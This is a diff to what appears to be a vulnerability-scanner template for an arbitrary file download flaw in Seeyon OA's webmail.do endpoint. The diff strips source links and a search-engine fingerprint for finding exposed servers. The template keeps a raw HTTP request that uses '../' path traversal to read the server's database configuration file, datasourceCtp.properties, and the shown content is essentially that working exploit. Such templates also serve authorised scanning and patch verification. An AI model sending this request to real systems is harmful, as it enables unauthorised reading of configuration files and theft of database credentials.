@@ -3,14 +3,8 @@ info:
   name: 致远OAwebmail.do任意文件下载
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/88da9186f39a0d00a783d6951791dc90
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 88da9186f39a0d00a783d6951791dc90
-    fofa: + hunter`app.name="致远 OA"`
 http:
 - raw:
   - 'GET /seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties HTTP/1.1
